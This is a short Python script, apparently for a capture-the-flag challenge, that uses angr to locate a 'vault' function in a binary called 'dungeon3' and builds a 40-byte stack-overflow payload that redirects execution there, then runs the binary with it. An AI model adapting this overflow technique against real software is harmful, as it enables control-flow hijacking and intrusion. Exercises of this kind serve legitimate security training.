import angr
import subprocess

def find_vault_address(binary_path):
    proj = angr.Project(binary_path, auto_load_libs=False)
    cfg = proj.analyses.CFG()

    vault_addr = None
    for func in cfg.kb.functions.values():
        if func.name == "vault":
            vault_addr = func.addr
            break

    return vault_addr

def exploit_dungeon3(buffer_size):
    binary_path = './dungeon3'
    proj = angr.Project(binary_path, auto_load_libs=False)

    vault_addr = find_vault_address(binary_path)
    if not vault_addr:
        print("Vault address not found.")
        return

    buffer_overflow_input = b'A' * buffer_size + vault_addr.to_bytes(8, 'little')

    with open('payload.txt', 'wb') as f:
        f.write(buffer_overflow_input)

    print("Generated payload.")

    # Execute dungeon3 with the payload as input
    subprocess.run(["./dungeon3"], stdin=open("payload.txt", "rb"), check=True)

if __name__ == "__main__":
    buffer_size = 40
    exploit_dungeon3(buffer_size)
